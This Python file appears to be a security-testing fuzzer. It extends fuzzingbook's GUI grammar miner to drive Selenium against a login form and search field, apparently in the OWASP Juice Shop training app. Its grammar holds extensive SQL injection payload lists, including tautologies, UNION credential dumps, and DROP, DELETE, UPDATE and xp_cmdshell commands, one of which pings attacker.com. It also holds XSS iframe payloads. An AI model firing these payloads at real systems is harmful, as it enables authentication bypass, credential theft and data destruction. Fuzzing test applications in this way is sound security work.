from fuzzingbook.GUIFuzzer import GUIGrammarMiner
from fuzzingbook.Grammars import START_SYMBOL, Grammar, crange, srange, opts

from selenium.common.exceptions import StaleElementReferenceException, NoSuchElementException
from selenium.webdriver.common.by import By

from typing import Set, FrozenSet

import html


START_STATE = "<state>"
UNEXPLORED_STATE = "<unexplored>"
FINAL_STATE = "<end>"

BETTER_GUI_GRAMMAR: Grammar = ({
        START_SYMBOL: [START_STATE],
        UNEXPLORED_STATE: [""],
        FINAL_STATE: [""],

        "<text>": ["<string>"],
        "<string>": ["<character>", "<string><character>"],
        "<character>": 
            ["<letter>", "<digit>", "<special>"], 

        "<letter>": crange('a', 'z') + crange('A', 'Z'),

        "<number>": ["<digits>"],
        "<digits>": ["<digit>", "<digits><digit>"],
        "<digit>": crange('0', '9'),

        "<special>": srange(". !"),

        "<email>": ["<string>@<string>"],
        "<letters>": ["<letter>", "<letters><letter>"],

        "<boolean>": ["True", "False"],

        "<password>": ["<string>"],

        "<hidden>": ["<string>"],
    })

SQLI_GRAMMAR: Grammar = ({
        START_SYMBOL: [START_STATE],
        UNEXPLORED_STATE: [""],
        FINAL_STATE: [""],

        "<XSS>": ["<left>iframe src=\"javascript:alert(<single-quote>xss<single-quote>)\"<right>",
                  "<left>iframe id=\"xss-soundcloud\" width=\"100%\" height=\"166\" scrolling=\"no\" frameborder=\"no\" allow=\"autoplay\" src=\"https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true\"<right>"],
        "<left>": ["<"],
        "<right>": [">"],        

        "<text>": ["<string>"],
        "<string>": ["<character>", "<string><character>"],
        "<character>": 
            ["<letter>", "<digit>", "<special>"], 

        "<letter>": crange('a', 'z') + crange('A', 'Z'),

        "<number>": ["<digits>"],
        "<digits>": ["<digit>", "<digits><digit>"],
        "<digit>": crange('0', '9'),

        "<special>": srange(". !"),
        "<single-quote>": ["\\'"],

        "<letters>": ["<letter>", "<letters><letter>"],

        "<boolean>": ["True", "False"],

        "<password>": ["<string>"],

        "<hidden>": ["<string>"],

        
        "<email>": [# "<string>@<string>.<string>"],
                     "<string>@<string>.<string><sqli>"], # enforce a SQLi payload in email generation 60% of the time

        "<sqli>": [("<tautologies>", opts(prob=0.33)),
                   ("<union>", opts(prob=0.33)), 
                   ("<piggy-backed>", opts(prob=0.0)), 
                   ("<illegal>", opts(prob=0.33))],
        
        "<tautologies>": [
            "\\' OR \\'1\\'=\\'1",
            "\\' OR \\'1\\'=\\'1\\'--",
            "\\' OR \\'1\\'=\\'1\\'/*",
            "\\' OR 1=1--",
            "\\' OR 1=1#",
            "\\' OR 1=1/*",
            "admin\\' OR \\'1\\'=\\'1",
            "admin\\' OR \\'1\\'=\\'1\\'--",
            "admin\\' OR \\'1\\'=\\'1\\'#",
            "\\' or 1=1--",
            "\\' or 1=1#",
            "\\' or 1=1/*",
            "\\') or \\'1\\'=\\'1--",
            "\\') or (\\'1\\'=\\'1--",
            "\\' or \\'x\\'=\\'x",
            "\\' or \\'x\\'=\\'x\\'--",
            "\\') or (\\'x\\'=\\'x",
            "\\' or \\'a\\'=\\'a",
            "\\' or \\'a\\'=\\'a\\'--",
            "\\') or (\\'a\\'=\\'a",
            "admin\\' --",
            "admin\\' #",
            "admin\\'/*",
            "\\' or \\'\\'=\\'",
            "\\' or \\'\\'=\\'\\'--",
            "\\' OR 1=1 LIMIT 1--",
            "\\' OR 1=1 LIMIT 1#",
            "\\' OR \\'1\\'=\\'1\\' LIMIT 1--",
            "1\\' OR \\'1\\'=\\'1",
            "1\\' OR 1=1--",
            "\\' or true--",
            "\\') or true--",
            "\\' or \\'ab\\'=\\'ab",
            "\\' or \\'ab\\'=\\'ab\\'--",
            "admin\\') or (\\'1\\'=\\'1\\'--",
            "admin\\') or \\'1\\'=\\'1\\'--",
            "\\') or 1=1--",
            "\\') or 1=1#",
            "\\' OR \\'something\\' = \\'something\\'--",
            "\\' OR \\'text\\' = \\'text\\'--",
            "admin\\' or \\'a\\'=\\'a",
            "admin\\' or 1=1--",
            "admin\\' or 1=1#"
        ],
        
        "<union>": [
            "\\' UNION SELECT NULL--",
            "\\' UNION SELECT NULL,NULL--",
            "\\' UNION SELECT NULL,NULL,NULL--",
            "\\' UNION SELECT NULL,NULL,NULL,NULL--",
            "\\' UNION SELECT 1,2,3--",
            "\\' UNION SELECT 1,2,3,4--",
            "\\' UNION SELECT 1,2,3,4,5--",
            "\\' UNION ALL SELECT NULL--",
            "\\' UNION ALL SELECT NULL,NULL--",
            "\\' UNION ALL SELECT NULL,NULL,NULL--",
            "\\' UNION ALL SELECT 1,2--",
            "\\' UNION ALL SELECT 1,2,3--",
            "\\' UNION ALL SELECT \\'a\\',\\'b\\'--",
            "\\' UNION ALL SELECT \\'a\\',\\'b\\',\\'c\\'--",
            "\\' UNION SELECT user,password FROM users--",
            "\\' UNION SELECT username,password FROM users--",
            "\\' UNION SELECT email,password FROM users--",
            "\\' UNION SELECT NULL,NULL,NULL FROM users--",
            "\\' UNION SELECT @@version,NULL,NULL--",
            "\\' UNION SELECT version(),NULL,NULL--",
            "\\' UNION SELECT database(),NULL,NULL--",
            "\\' UNION SELECT user(),NULL,NULL--",
            "\\' UNION SELECT table_name,NULL FROM information_schema.tables--",
            "\\' UNION SELECT column_name,NULL FROM information_schema.columns--",
            "\\' UNION SELECT \\'admin\\',\\'password\\'--",
            "\\' UNION SELECT \\'admin\\',\\'5f4dcc3b5aa765d61d8327deb882cf99\\'--",
            "admin\\' UNION SELECT NULL,NULL--",
            "admin\\' UNION SELECT 1,2--",
            "admin\\' UNION SELECT \\'a\\',\\'b\\'--",
            "1\\' UNION SELECT NULL,NULL--",
            "1\\' UNION SELECT 1,2,3--",
            "\\') UNION SELECT NULL--",
            "\\') UNION SELECT NULL,NULL--",
            "\\') UNION SELECT 1,2--",
            "\\' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL--",
            "\\' UNION ALL SELECT 1,2,3,4,5,6--",
            "\\' UNION SELECT * FROM users--",
            "\\' UNION SELECT * FROM users WHERE \\'1\\'=\\'1\\'--",
            "\\' UNION SELECT id,username,password FROM users--",
            "\\' UNION SELECT schema_name FROM information_schema.schemata--"
        ],
        
        "<piggy-backed>": [
            "\\'; DROP TABLE users--",
            "\\'; DROP TABLE users#",
            "admin\\'; DROP TABLE users--",
            "1\\'; DROP TABLE users--",
            "\\'; DELETE FROM users--",
            "\\'; DELETE FROM users WHERE \\'1\\'=\\'1\\'--",
            "admin\\'; DELETE FROM users--",
            "\\'; UPDATE users SET password=\\'hacked\\'--",
            "\\'; UPDATE users SET password=\\'password\\' WHERE username=\\'admin\\'--",
            "\\'; INSERT INTO users VALUES (\\'hacker\\',\\'password\\')--",
            "\\'; INSERT INTO users (username,password) VALUES (\\'hacker\\',\\'pass\\')--",
            "\\'; EXEC xp_cmdshell(\\'dir\\')--",
            "\\'; EXEC sp_executesql N\\'SELECT * FROM users\\'--",
            "admin\\'; SHUTDOWN--",
            "\\'; SHUTDOWN WITH NOWAIT--",
            "1\\'; DROP DATABASE test--",
            "\\'; CREATE USER hacker IDENTIFIED BY \\'pass\\'--",
            "\\'; GRANT ALL PRIVILEGES TO hacker--",
            "admin\\'; SELECT SLEEP(5)--",
            "\\'; WAITFOR DELAY \\'00:00:05\\'--",
            "1\\'; BENCHMARK(5000000,MD5(\\'test\\'))--",
            "\\'; SELECT pg_sleep(5)--",
            "admin\\'; UPDATE users SET role=\\'admin\\' WHERE username=\\'user\\'--",
            "\\'; TRUNCATE TABLE logs--",
            "\\'; ALTER TABLE users ADD COLUMN hacked VARCHAR(255)--",
            "admin\\'; SELECT load_file(\\'/etc/passwd\\')--",
            "\\'; SELECT * FROM users INTO OUTFILE \\'/tmp/users.txt\\'--",
            "1\\'; EXEC master..xp_cmdshell \\'ping attacker.com\\'--"
        ],
        
        "<illegal>": [
            "\\'",
            "\\'\\'",
            "\"",
            "\"\"",
            "admin\\'",
            "admin\"",
            "\\' AND 1=2--",
            "\\' AND 1=0--",
            "\\' AND \\'a\\'=\\'b",
            "\\' AND \\'a\\'=\\'b\\'--",
            "admin\\' AND 1=2--",
            "admin\\' AND \\'x\\'=\\'y\\'--",
            "1\\' AND 1=0--",
            "\\') AND 1=2--",
            "\\' HAVING 1=2--",
            "\\' HAVING 1=0--",
            "\\' GROUP BY 1 HAVING 1=2--",
            "\\' ORDER BY 100--",
            "\\' ORDER BY 999--",
            "\\' ORDER BY 1000--",
            "admin\\' ORDER BY 100--",
            "\\' AND (SELECT * FROM nonexistent)--",
            "\\' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>1000--",
            "\\' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
            "\\' UNION SELECT 1 FROM dual WHERE 1=2--",
            "admin\\' CAST(0x01 AS INT)--",
            "\\' CONVERT(INT,@@version)--",
            "\\' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
            "\\' AND UPDATEXML(1,CONCAT(0x7e,database()),1)--",
            "\\' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "\\' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CHAR(126),CHAR(126),FLOOR(RAND(0)*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x LIMIT 1)--",
            "admin\\' AND EXTRACTVALUE(0,CONCAT(0x7e,version()))--",
            "\\' XOR 1=1--",
            "\\' XOR 1=2--",
            "admin\\' XOR 1=0--",
            "\\' AND ASCII(SUBSTRING((SELECT @@version),1,1))>50--",
            "\\' AND LENGTH(database())>100--",
            "\\' RLIKE (SELECT * FROM (SELECT 1)a)--",
            "\\' AND 1 IN (SELECT @@version)--",
            "\\' AND EXP(~(SELECT * FROM (SELECT 1)x))--"
        ],
    })


class JuicyGrammarMiner(GUIGrammarMiner):
    # GUI_GRAMMAR = BETTER_GUI_GRAMMAR
    GUI_GRAMMAR = SQLI_GRAMMAR

    def __init__(self, driver, XSS):
        self.XSS = XSS
        super().__init__(driver)

    def mine_input_element_actions(self) -> Set[str]:
        """Determine all input actions on the current Web page"""

        actions = set()

        form = self.driver.find_element(By.TAG_NAME, "app-login")

        for elem in form.find_elements(By.TAG_NAME, "input"):
            try:
                input_type = elem.get_attribute("type")
                input_name = elem.get_attribute("id") 
            
                if input_name is None or input_name == '':
                    input_name = elem.text

                if input_name != 'loginButtonGoogle' and input_name != "": 
                    if input_type in ["checkbox", "radio"]:
                        actions.add("check('%s', <boolean>)" % html.escape(input_name))
                    elif input_type in ["text", "number", "email", "password"]:
                        actions.add("fill('%s', '<%s>')" % (html.escape(input_name), html.escape(input_type)))
                    elif input_type in ["button", "submit"]:
                        actions.add("submit('%s')" % html.escape(input_name))
                    elif input_type in ["hidden"]:
                        pass
                    else:
                        actions.add("fill('%s', <%s>)" % (html.escape(input_name), html.escape(input_type)))

            except StaleElementReferenceException:
                pass

        return actions
    
    def mine_button_element_actions(self) -> Set[str]:
        """Determine all button actions on the current Web page"""

        actions = set()

        form = self.driver.find_element(By.TAG_NAME, "app-login")

        for elem in form.find_elements(By.TAG_NAME, "button"):
            try:
                button_type = elem.get_attribute("type")
                button_name = elem.get_attribute("id")

                if button_name is None or button_name == '':
                    button_name = elem.text

                if button_name != 'loginButtonGoogle' and button_name != "":        
                    if button_type == "submit":
                        actions.add("submit('%s')" % html.escape(button_name))
                    elif button_type != "reset":
                        actions.add("click('%s')" % html.escape(button_name))
            except StaleElementReferenceException:
                pass

        return actions
    
    def mine_search_field(self) -> Set[str]:
        actions = set()

        try:
            #self.driver.find_element(By.ID, "searchQuery").click()
            search_field = self.driver.find_element(By.ID, "mat-input-1")
            actions.add("search('<XSS>')")
            return actions
        except NoSuchElementException:
            return actions
    
    def mine_state_actions(self) -> FrozenSet[str]:
        """Return a set of all possible actions on the current Web site.
        Can be overloaded in subclasses."""
        if (self.XSS):
            return frozenset(self.mine_search_field())    
        
        return frozenset(self.mine_input_element_actions()
                         | self.mine_button_element_actions()) #TODO links are removed for now
